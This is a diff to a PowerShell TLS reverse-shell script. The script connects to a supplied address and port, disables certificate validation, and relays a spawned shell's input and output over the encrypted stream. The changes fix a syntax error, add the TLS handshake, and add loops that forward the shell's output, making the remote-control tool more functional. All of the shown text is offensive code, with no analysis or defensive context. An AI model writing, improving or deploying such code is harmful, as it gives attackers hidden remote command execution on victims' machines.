@@ -1,7 +1,8 @@
 param($address,$port,$shell)
 $tcpclient = new-object net.sockets.tcpclient($address,$port)
 $tcpstream = $tcpclient.getstream()
-$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true}))
+$tlsstream = new-object net.security.sslstream($tcpstream,$false,[net.security.remotecertificatevalidationcallback]{$true})
+$tlsstream.authenticateasclient(0)
 $tlsstreamwriter = new-object io.streamwriter($tlsstream)
 $tlsstreamwriter.autoflush = $true
 $tlsstreamreader = new-object io.streamreader($tlsstream)
@@ -20,5 +21,14 @@ $stderr = $shell.standarderror
 $stdin = $shell.standardinput
 while(($shell.hasexited -eq $false))
 {
+	while($stdout.peek() -gt -1)
+	{
+		$tlsstreamwriter.write([char]$stdout.read())
+	}
 	$stdin.writeline($tlsstreamreader.readline())
+	do
+	{
+		$tlsstreamwriter.write([char]$stdout.read())
+	}
+	until($stdout.peek() -le -1)
 }
